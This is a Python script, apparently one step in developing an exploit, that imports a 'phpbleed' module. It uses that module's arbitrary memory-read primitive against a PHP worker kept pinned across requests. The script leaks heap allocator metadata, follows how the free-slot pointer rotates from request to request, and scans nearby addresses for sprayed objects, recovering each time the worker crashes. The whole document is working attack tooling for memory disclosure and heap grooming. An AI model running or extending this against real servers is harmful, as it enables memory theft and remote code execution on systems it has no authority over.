#!/usr/bin/env python3
"""R-6 diagnostic #2: watch heap->free_slot[16] rotate across consecutive
pinned requests, and probe slots around the discovered values to map the
bin-320 rotation set on the pinned worker."""
import json
import struct
import importlib.util

spec = importlib.util.spec_from_file_location('pb', 'phpbleed_8089.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)

st = json.load(open(pb.STATE_FILE))
heap_ref = st['heap_ref']
chunk = heap_ref & ~0x1FFFFF
print(f"heap_ref={heap_ref:#x} chunk={chunk:#x}")

assert pb.pin_open(), "pin open failed"

def meta_read():
    r = pb.isstring_read(chunk + 0x40, pinned=True)
    if r is None:
        return None
    slen, data = r
    free16 = struct.unpack_from('<Q', data, 136)[0]
    main_chunk = struct.unpack_from('<Q', data, 304)[0]
    size = slen
    return free16, main_chunk, size, data

print("\n=== free_slot[16] rotation across consecutive pinned requests ===")
vals = []
for i in range(6):
    m = meta_read()
    if m is None:
        print(f"  #{i}: meta read CRASH (pin died?) pin_alive={pb.pin_alive()}")
        if not pb.pin_alive():
            print("  re-pinning")
            assert pb.pin_open()
        continue
    free16, main_chunk, size, data = m
    vals.append(free16)
    print(f"  #{i}: free_slot[16]={free16:#x} (page {free16>>12 & 0x1FF if free16 else '-'}) "
          f"main_chunk={main_chunk:#x} heap->size={size}")

print("\n=== probing slots around the observed values (crash-tolerant) ===")
seen = set()
cands = set()
for v in vals:
    if not (0x10000 < v <= pb.ADDR_MAX):
        continue
    page = v & ~0xFFF
    for pg in (page - 0x1000, page, page + 0x1000):
        for slot in range(13):
            cands.add(pg + slot * 320)
hits = []
for addr in sorted(cands):
    if not pb.pin_ok():
        print("  pin budget/dead; re-pinning")
        pb.pin_open()
        if not pb.pin_alive():
            break
    r = pb.isstring_read(addr, pinned=True)
    if r is None:
        print(f"  {addr:#x}: CRASH")
        if not pb.pin_alive():
            pb.pin_open()
        continue
    slen, data = r
    tag = ''
    if slen == pb.SPRAY_LEN:
        tag = ' <<SPRAY280>>'
        hits.append(addr)
    print(f"  {addr:#x}: len={slen}{tag} head={data[:12].hex()}")

print(f"\nspray slots found: {[hex(h) for h in hits]}")
pb.pin_close()
print("done")
